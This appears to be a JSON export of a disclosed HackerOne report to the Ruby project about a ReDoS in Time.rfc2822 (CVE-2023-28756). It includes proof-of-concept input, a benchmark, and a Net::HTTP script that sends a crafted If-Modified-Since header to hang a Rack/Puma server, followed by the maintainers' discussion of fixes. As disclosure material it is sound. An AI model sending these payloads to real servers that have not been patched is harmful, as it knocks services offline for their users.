@@ -1,0 +1,388 @@
+{
+  "id": 1485501,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDg1NTAx",
+  "url": "https://hackerone.com/reports/1485501",
+  "title": "ReDoS in Time.rfc2822",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2022-02-18T22:22:29.852Z",
+  "submitted_at": "2022-02-18T22:22:29.876Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ooooooo_q",
+    "url": "/ooooooo_q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/9a55e00ecd2cdf18a7f40678e6836e4cdc90bf95eb4b50c43f5fb775da40bb65"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7724,
+    "url": "https://hackerone.com/ruby",
+    "handle": "ruby",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Ruby",
+      "twitter_handle": "",
+      "website": "https://www.ruby-lang.org",
+      "about": "A Programmer's Best Friend"
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2023-28756"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-05-16T03:07:30.089Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-05-13T20:59:46.553Z",
+  "team_member_agreed_on_going_public_at": "2023-05-16T03:07:29.959Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello, I found a pattern that occur ReDoS in `Time.rfc2822` (and `Time.rfc822`).\n\nhttps://github.com/ruby/time/blob/v0.2.0/lib/time.rb#L505\n\n```ruby\n    def rfc2822(date)\n      if /\\A\\s*\n          (?:(?:Mon|Tue|Wed|Thu|Fri|Sat|Sun)\\s*,\\s*)?\n          (\\d{1,2})\\s+\n          (Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\\s+\n          (\\d{2,})\\s+\n          (\\d{2})\\s*\n          :\\s*(\\d{2})\\s*\n          (?::\\s*(\\d{2}))?\\s+\n          ([+-]\\d{4}|\n           UT|GMT|EST|EDT|CST|CDT|MST|MDT|PST|PDT|[A-IK-Z])/ix =~ date\n```           \n\nIt is a detect result by `recheck` ( https://makenowjust-labs.github.io/recheck/ ).\n\n{F1624605}\n\n## PoC\n\n```\n❯ ruby -v\nruby 3.1.1p18 (2022-02-18 revision 53f5fc4236) [arm64-darwin20]\n\n❯ irb\nirb(main):001:0> require 'time'\n=> true\nirb(main):002:0>  Time.rfc2822 \"0 Feb 00 00 :00\" + \" \" * 20000\n# => ReDoS (and raise ArgumentError)\n```\n\n## benchmark\n\nrfc2822_benchmark.rb\n\n```ruby\nrequire 'benchmark'\nrequire 'time'\n  \ndef rfc2822_parse(length)\n  text = \"0 Feb 00 00 :00\" + \" \" * length\n  Time.rfc2822(text)\nrescue ArgumentError\n  nil\nend\n\nBenchmark.bm do |x|\n  x.report { rfc2822_parse(100) }\n  x.report { rfc2822_parse(1000) }\n  x.report { rfc2822_parse(10000) }\n  x.report { rfc2822_parse(100000) }\nend\n```\n\n```\n❯ bundle exec ruby rfc2822_benchmark.rb\n       user     system      total        real\n   0.000326   0.000009   0.000335 (  0.000344)\n   0.029284   0.000054   0.029338 (  0.029469)\n   2.860528   0.007354   2.867882 (  2.875771)\n 290.843621   0.889107 291.732728 (292.665729)\n```\n\n---\n\n\n## Rack\n\nIn `Rack::ConditionalGet`, the header value is parsed by `Time.rfc2822`, so it is possible to attack from the request.\n\nhttps://github.com/rack/rack/blob/2.2.3/lib/rack/conditional_get.rb#L52\n\n### PoC\n\nGemfile\n\n```\n# frozen_string_literal: true\n\nsource \"https://rubygems.org\"\n\ngem 'rack', '~> 2.2', '>= 2.2.3'\ngem 'puma', '~> 5.6', '>= 5.6.2'\n```\n\nconfig.ru\n\n```ruby\nclass Server\n  def call(env)\n    # puts env\n    [ 200, {}, [\"...\"]]\n  end\nend\n\nuse ::Rack::ConditionalGet\nrun Server.new\n```\n\n```ruby\nrequire 'net/http'\n\nurl = URI.parse('http://127.0.0.1:9292/')\n\nreq = Net::HTTP::Get.new(url.path)\n\nreq['IF_MODIFIED_SINCE'] =  \"0 Feb 00 00 :00\" + \" \" * 20000 + \"+0\"\n\nres = Net::HTTP.start(url.host, url.port) {|http|\n  http.request(req)\n}\nputs res.body\n```\n\n```\n❯ time bundle exec ruby rfc2822_request.rb\n...\nbundle exec ruby rfc2822_request.rb  0.18s user 0.07s system 2% cpu 11.516 total\n```\n\n## Impact\n\nReDoS occurs when `Time.rfc2822` accepts user input.\n\nRails uses `::Rack::ConditionalGet` by default, so it can be attacked by a request from the client.\n\nIf using nginx etc., the header length is limited to about 8k bytes, so it seems to be less affected. ( https://stackoverflow.com/questions/686217/maximum-on-http-header-values )\n\nOn the other hand, puma is susceptible because it can be used up to 80 * 1024.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1624605,
+      "file_name": "recheck_1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/evaoc00tz50qnyoc0bwjm0ptn0f5?response-content-disposition=attachment%3B%20filename%3D%22recheck_1.png%22%3B%20filename%2A%3DUTF-8%27%27recheck_1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065521Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c44e2af0367d251fb5e93d4d6342d1e620bdd7dd789e87d8a82252e76a739ecd",
+      "file_size": 453350,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2023-06-12T20:59:46.650Z",
+  "allow_singular_disclosure_after": -8848534.639647176,
+  "singular_disclosure_allowed": true,
+  "vote_count": 5,
+  "voters": [
+    "zy9ard3",
+    "shivammusic",
+    "bij4n53c",
+    "sanjay_0291",
+    "infinityx24"
+  ],
+  "structured_scope": {
+    "databaseId": 28212,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/ruby/ruby",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 15749631,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@Ruby\n\nWill these reports be triaged?\nOr are you considering drastic measures for Regexp?\n\nIf use `recheck`, can find many other parts that are probably vulnerable.\nShould I report it individually?",
+      "automated_response": false,
+      "created_at": "2022-03-05T05:09:32.705Z",
+      "updated_at": "2022-03-05T05:09:32.705Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 15754950,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thank you for your reporting and sorry for my late reply. I'd like to discuss this topic to the next developers' meeting.\n\nI also applied recheck to regexps in stdlib and have already known that many are \"vulnerable\". However, your reports are still helpful for us because they are not theoretical; your comments about whether an attack is practically feasible, such as Rack. I'd appreciate it if you could continue to send reports.\n\nBTW, as you may think, I don't think that it is a practical solution to handle each of the issues as security issues. I believe there are many other \"vulnerable\" regexps not only in stdlibs but also in third-party libraries and applications including private ones. In my current opinion, a short-term solution is to introduce [Regexp.timeout=](https://bugs.ruby-lang.org/issues/17837) and announce to users to set the timeout depending on their application requirements. It will mitigate the issues by relaxing ReDoS to non-DoS so that we can fix them as normal issues, not security ones. Let me know if you have an opinion about this. (Note that this is just my opinion currently. After dev-meeting, we may reach to a different conclusion.)",
+      "automated_response": false,
+      "created_at": "2022-03-05T17:29:45.340Z",
+      "updated_at": "2022-03-05T17:29:45.340Z",
+      "actor": {
+        "username": "mame",
+        "cleared": false,
+        "verified": false,
+        "url": "/mame",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/8vhoh1hyan61xovrmfhy7kmi4gib/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 15763070,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-03-07T02:53:46.971Z",
+      "updated_at": "2022-03-07T02:53:46.971Z",
+      "actor": {
+        "username": "hsbt",
+        "cleared": false,
+        "verified": false,
+        "url": "/hsbt",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065521Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5f860d3b2566673ca00b5a530464361d820535ec09dbd08e726991f9ee93d28d"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 15853812,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@mame\nUnderstood, I will look into the ones that seem to have a large impact.\n\nI've thought a lot about timeouts (or some restrictions), but there seems to be no other way. \nHowever, if it is detected as exponential and the cost of the attack is low, or if the regular expression can be executed multiple times like Net::HTTP, it seems better to deal with it as a vulnerability. Especially on a http server, if attacker can generate more ReDoS at the same time than puma and unicorn workers, it is not difficult to make the server unresponsive.\n\nI am wondering if it will be backported to ruby 2.7 or 3.0, but will wait for the results of the dev meeting.",
+      "automated_response": false,
+      "created_at": "2022-03-13T00:59:18.943Z",
+      "updated_at": "2022-03-13T00:59:18.943Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 19720922,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "It is a benchmark with Ruby3.2.0. ReDoS still occurs but could be mitigated by timeout.\n\n```\n# Ruby 3.2.0\n❯ bundle exec ruby rfc2822_benchmark.rb\n       user     system      total        real\n   0.000399   0.000001   0.000400 (  0.000398)\n   0.035984   0.000014   0.035998 (  0.036022)\n   3.612121   0.007010   3.619131 (  3.621582)\n 364.668771   0.667106 365.335877 (365.889942)\n\n# Regexp.timeout = 1 \n❯ bundle exec ruby rfc2822_benchmark.rb\n       user     system      total        real\n   0.000401   0.000003   0.000404 (  0.000397)\n   0.037018   0.000043   0.037061 (  0.037122)\n.../ruby/3.2.0/gems/time-0.2.0/lib/time.rb:515:in `rfc2822': regexp match timeout (Regexp::TimeoutError)\n```",
+      "automated_response": false,
+      "created_at": "2022-12-28T03:59:42.788Z",
+      "updated_at": "2022-12-28T03:59:42.788Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 20923697,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CveIdAdded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-03-23T03:26:13.134Z",
+      "updated_at": "2023-03-23T03:26:13.134Z",
+      "cve_ids": [
+        "CVE-2023-28756"
+      ],
+      "actor": {
+        "username": "hsbt",
+        "cleared": false,
+        "verified": false,
+        "url": "/hsbt",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065521Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5f860d3b2566673ca00b5a530464361d820535ec09dbd08e726991f9ee93d28d"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 21052884,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "@ooooooo_q We fixed and disclosed this ReDoS vulnerability at https://www.ruby-lang.org/en/news/2023/03/30/redos-in-time-cve-2023-28756/. and this is assigned CVE-2023-28756. I requested to publish CVE-2023-28756 to MITRE now. \n\nCan you contact bounty to https://hackerone.com/ibb after published CVE from MITRE?\n\nThank you for your report.",
+      "automated_response": false,
+      "created_at": "2023-03-31T03:39:16.361Z",
+      "updated_at": "2023-03-31T03:39:16.361Z",
+      "actor": {
+        "username": "hsbt",
+        "cleared": false,
+        "verified": false,
+        "url": "/hsbt",
+        "profile_picture_urls": {
+          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/dx6z1zqthgan1c4rv9ppn4jx3832/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%222eUvHh_4_400x400.png%22%3B%20filename%2A%3DUTF-8%27%272eUvHh_4_400x400.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQU5JYKTGM%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065521Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJIMEYCIQDPextUgVMaFUn7J3YE8kNYUZyiY2543ePlEF9CwFfM8QIhAIRilag%2FrZ1iszKpt2JLQyz8teMsWBamJF4Iou7wqMU3KrIFCCMQAxoMMDEzNjE5Mjc0ODQ5Igwu56k94pqVtX8r%2Bo4qjwXEh1PM7wf2Np3Qm66HGnlSD0VTqg7R%2FtI4UnXMImbHLHRC5z94z14%2FX2eWyQeiZAAq3PHSCaPLB7tsZX%2ByCkLvYSKIVEDIBAiJLNfPf0mrHAbRDGyc8keEypRUwMaT5cop25r%2FpVpMdM%2BVhJVrWWa5ovVSzsmubSxixbH%2BvSDMHrKZm1mklKunLYykTJQX%2BiX5bQw3i%2BjEj3n27mXAVXGx17uJj4AZzaAdAN%2Fb7nblHihfCONYhSlmArkzxiwacZx5n%2BkCMiJbI49SZjueO3VcmcjD7qJl9BwZ1W4QT01LH5E0r%2FauBeDReLPQR2A89V610Uem1zJCLjoNtjcpr%2Fy6PNyHeeAwa067JLmyxsCZL2gdW81O9EGHtcrxXf7TlH8A3h0yPO%2B8zVoyJSSsEzzjpzkscidQ86LAyX6CNqqcdHnUJsXeboKB5dqjOphDJLDRfmLzgZTuPihjRKzkML0G3QjO1fWCgDatC%2FHiCuz%2F4Hm5bamHTrdiVE9y%2B%2Bv6QZ2edEQAzLX1lowLp2RzYtTYHwDzZkAjKZJKVeO9zj1pkoJhjfz2VARzHSySfXw0YMwPUVlRPg7L6f%2BQAjpso7C6uYEeozwfIwrkmBFVTZW%2BLEzdRLHNNz7rHyr9w1WlRj4OjJLn5Ee5sdJ5cEyQgF8ir1s09BXAP%2FsqR7THqh25ijYpQsYTzGdJxWFw9Mcq455M0MG7I8oz1i3cTjV9eJJer5Vnjtubr681ZNh6Cbl85VC5gKL3xiZ%2BRa64M54QAtb9tRvCFdlmV7U2Yel7eiB1thRiUc%2BQBXeECkUKbOXNfSGQ6%2FRqu7AD4Qz0GIKmc6obQ3vJeTlVjbt80VYdsyGeWYLjRSjnDrYNEFDoOJTBMPSHuagGOrABfJMTnU4%2FETzLB2BZXf541hyjNiWZ3tqKyh4p%2BOtMGjGYCmsTcu5RXXYGZ3G0puxZ27J20XRP2zhvuPBXAixyr8lz8adwCOfLJe0oCYgqgYmQxwbXeE5pLP9eHwIk2aiqxaN2tTNVGnFifZgT%2BzaAvEW1M5e4bcPdHOcraaqJVAJKjLuYHBPVtsgKcNUbL9bdOH2zFoQgd6ok2JFMDfaY%2FOJ38QDDXR4GXVTD01IxQcc%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5f860d3b2566673ca00b5a530464361d820535ec09dbd08e726991f9ee93d28d"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "ooooooo_q",
+        "url": "/ooooooo_q"
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 21077313,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@hsbt \nReport submitted to IBB. https://hackerone.com/reports/1929567",
+      "automated_response": false,
+      "created_at": "2023-04-01T23:54:17.542Z",
+      "updated_at": "2023-04-01T23:54:17.542Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 21834846,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-05-13T20:59:46.589Z",
+      "updated_at": "2023-05-13T20:59:46.589Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ruby"
+    },
+    {
+      "id": 21862585,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-05-16T03:07:30.004Z",
+      "updated_at": "2023-05-16T03:07:30.004Z",
+      "actor": {
+        "username": "hsbt",
+        "cleared": false,
+        "verified": false,
+        "url": "/hsbt",
+        "profile_picture_urls": {
